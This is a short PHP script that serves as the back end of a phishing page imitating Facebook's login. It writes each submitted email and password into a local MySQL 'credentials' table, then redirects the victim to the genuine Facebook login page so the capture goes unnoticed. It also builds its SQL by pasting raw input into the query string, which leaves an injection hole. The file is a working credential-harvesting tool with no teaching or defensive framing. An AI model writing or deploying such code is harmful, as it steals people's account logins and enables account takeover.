<?php
$servername = "localhost";
$username   = "root";
$password   = "";
$dbname     = "eypbi";

if ($_POST) {
$conn     = new mysqli($servername, $username, $password, $dbname);
$email    = $_POST['email'];
$password = $_POST['pass'];
$sql      = "INSERT INTO credentials (email, password)
VALUES ('$email', '$password')";
$conn->query($sql);
$conn->close();
header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
die();
}
?>